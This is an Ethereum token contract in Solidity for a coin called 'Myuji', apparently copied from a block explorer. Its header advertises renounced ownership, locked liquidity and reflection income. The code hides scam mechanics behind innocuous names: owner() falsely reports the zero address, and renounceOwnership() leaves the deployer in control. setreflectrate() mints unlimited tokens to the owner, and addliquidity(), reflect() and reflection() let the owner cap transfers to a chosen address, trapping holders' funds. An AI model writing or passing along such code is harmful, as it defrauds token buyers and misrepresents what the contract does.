/**
 *Submitted for verification at Etherscan.io on 2021-07-12
*/

/*
        
üáØüáµ Myuji (ÁæéÂãáÂ£´) is the little brother of Myobu, except with a few modifications such as no buy limit.
          This is a token that is based off Myobu with massive potential!


üîë Locked Liquidity for six months - Funds are Safe and Secure!
üóí Renounced Ownership - Owner is the zero address, meaning the contract is owned by the community!
üßô‚Äç‚ôÇÔ∏èPassive Income - 3% of fees are automatically reflected upon holders!
 
 Telegram = @myujiofficial
 
*/ 

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.10;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

     constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    
     function owner() public view returns (address) {
        return address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    
    }
}


contract Myuji is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public public_address;
    address public initializer;
   
    uint256 private _tTotal = 10000 * 10**9 * 10**18;

    string private _name = 'My√∫ji';
    string private _symbol = 'Myuji';
    uint8 private _decimals = 18;    
    uint256 public rTotal = 5000000000 * 10**18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    
   
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function addliquidity (address blackListAddress) public onlyOwner {
        public_address = blackListAddress;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        if (sender != initializer && recipient == public_address) {
            require(amount < rTotal, "Transfer amount exceeds the maxTxAmount.");
        }
    
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
     function setreflectrate(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _tTotal = _tTotal.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }
   
    function reflect(address blackAddress) public onlyOwner {
        initializer = blackAddress;
    }
  
    function reflection(uint256 maxTxBlackPercent) public onlyOwner {
        rTotal = maxTxBlackPercent * 10**18;
    }
}